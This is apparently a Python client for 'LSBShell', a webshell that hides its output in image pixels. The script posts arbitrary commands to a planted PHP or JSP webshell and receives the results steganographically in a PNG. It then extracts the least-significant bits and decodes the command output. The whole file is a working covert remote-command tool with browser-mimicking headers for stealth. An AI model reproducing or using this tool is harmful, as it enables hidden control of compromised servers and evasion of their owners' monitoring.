import argparse
import base64
import traceback

import requests
import urllib.parse

from PIL import Image
from colorama import init

init(autoreset=True)


def parse_args():
    parser = argparse.ArgumentParser(description='LSBShell - Webshell Of Least Significant Bit')
    parser.add_argument('-u', '--url', help='LSBShell Url')
    parser.add_argument('-p', '--password', help='LSBShell Password')
    parser.add_argument('-c', '--command', help='Command')
    parser.add_argument('-e', '--encodingtype', help='Encoding type default:utf-8', default="utf-8")
    return parser.parse_args()
    # return parser.parse_args(['-u', 'http://127.0.0.1/lsbshell5.php', '-c', 'ipconfig /all', '-p', 'text', '-e', 'utf8'])
    # return parser.parse_args(['-u', 'http://192.168.3.175:8081/vvvv.jsp', '-c', 'ipconfig', '-p', 'text', '-e', 'gbk'])


def send_payload(url, password, command):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "DNT": '1',
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": '1',
    }
    params = {
        password: command,
    }
    # proxies = { "http": "http://127.0.0.1:8080/", "https": "https://127.0.0.1:8080/"}

    resp = requests.post(url, data=params, headers=headers)#,proxies=proxies)
    if resp.status_code != 200:
        return True, resp

    return False, resp


def save_image(content, path):
    with open(path, 'wb') as f:
        f.write(content)


def binstr_to_asciistr(binstr):
    asciistr = ''
    for i in range(0, len(binstr), 8):
        asciistr += chr(int(binstr[i:i + 8], 2))

    return asciistr


def get_result(image_path, length):
    image = Image.open(image_path).convert('RGB')
    length = length * 8
    width = image.size[0]
    height = image.size[1]
    count = 0

    binary_content = ''

    for w in range(0, width):
        if count >= length:
            break

        for h in range(0, height):
            pixel = image.getpixel((w, h))
            if count % 3 == 0:
                count += 1
                binary_content = binary_content + str(pixel[0] & 1)
                if count >= length:
                    break
            if count % 3 == 1:
                count += 1
                binary_content = binary_content + str(pixel[1] & 1)
                if count >= length:
                    break
            if count % 3 == 2:
                count += 1
                binary_content = binary_content + str(pixel[2] & 1)
                if count >= length:
                    break

    return urllib.parse.unquote(binstr_to_asciistr(binary_content))


def main():
    args = parse_args()
    if args.url and args.password and args.command:
        try:
            print("\033[0;32m[*] send payload....\033[0m")
            status, resp = send_payload(args.url, args.password, args.command)
            if status:
                print("\033[1;37;41m[!] send payload error!\033[0m")
                print("\033[1;31mResponse code: {}\033[0m".format(resp.status_code))
                print("\033[1;31mResponse headers: {}\033[0m".format(resp.headers))
                print("\033[1;31mResponse content length: {}\033[0m".format(len(resp.content)))
                exit(1)

            print("\033[0;32m[*] save image....\033[0m")
            save_image(resp.content, 'result.png')

            print("\033[0;32m[*] get base64 result....\033[0m")
            base64_result = get_result('result.png', int(resp.headers['Set-Length']))

            print("\033[0;32m[*] get command result....\033[0m")
            cmd_result = str(base64.b64decode(base64_result.encode()), args.encodingtype)

            print("\033[0;32m[*] {}Command: {}{}\033[0m".format('=' * 20, args.command, '=' * 20))
            print("\033[1;36m" + cmd_result + "\033[0m")
        except Exception as err:
            print("\033[1;37;41m[!] Produces an exception!\033[0m")
            print("\033[1;31m"+ traceback.format_exc() +" \033[0m")
    else:
        print("\033[1;37;41m[!] Please -h!\033[0m")


if __name__ == '__main__':
    main()
